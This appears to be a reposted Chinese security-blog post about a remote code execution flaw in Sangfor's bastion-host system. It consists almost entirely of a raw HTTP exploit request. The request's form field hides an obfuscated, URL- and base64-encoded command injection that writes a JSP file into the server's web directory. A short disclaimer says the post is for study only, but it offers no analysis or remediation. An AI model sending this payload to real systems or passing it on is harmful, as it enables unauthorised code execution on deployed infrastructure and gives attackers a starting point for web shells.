> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzIxMTg1ODAwNw==&mid=2247500933&idx=1&sn=c35687f22a88f65f599bf8b86cd0a51f

#  深信服运维安全管理系统RCE漏洞  
 网络安全透视镜   2025-07-07 23:30  
  

```
POST /fort/system;login/netConfig/set_port HTTP/1.1
Host: 127.0.0.1:1433
Cookie: sessionid=stc0IkIAbGvfWmYHCijEEr3QpEmswCCOkZtEVFI5BMle3vGS4YT4iS67NusJbgkiA%2Cfn24jPKbUEg6n1DlCo%2CPFWy3f90ToYzRdrHc8TBxmcGOe%2CSN%2CvNT6uJhNEFjFD; hadSetUkey=0
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 594
Connection: close


select=6379%2B-j%2BDROP%0A%62%61%73%68%20%2d%63%20%24%28%65%63%68%6f%20%5a%57%4e%6f%62%79%41%69%55%45%4e%57%64%6d%52%59%55%58%56%6b%4d%30%70%77%5a%45%64%56%62%30%6c%71%52%57%6c%4c%56%48%4e%73%55%47%63%39%50%53%49%67%66%47%4a%68%63%32%55%32%4e%43%41%74%5a%43%41%2b%49%43%39%31%63%33%49%76%62%47%39%6a%59%57%77%76%64%47%39%74%59%32%46%30%4c%33%64%6c%59%6d%46%77%63%48%4d%76%5a%6d%39%79%64%43%39%30%63%6e%56%7a%64%43%39%32%5a%58%4a%7a%61%57%39%75%4c%32%78%76%5a%79%35%71%63%33%41%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%20%2d%69%29%0a%65%78%69%74%3b%0Aecho&Unselect=22,443,9443
```

  
  
# 文章来源互联网收集整理，请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS51gqsJwIM82Y5RTicXUygDUxQ76EiavrIibm8L0BUzdF6veUR4dQOKJn2iaEFQlNeq0PIPSFXTibx0OZw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
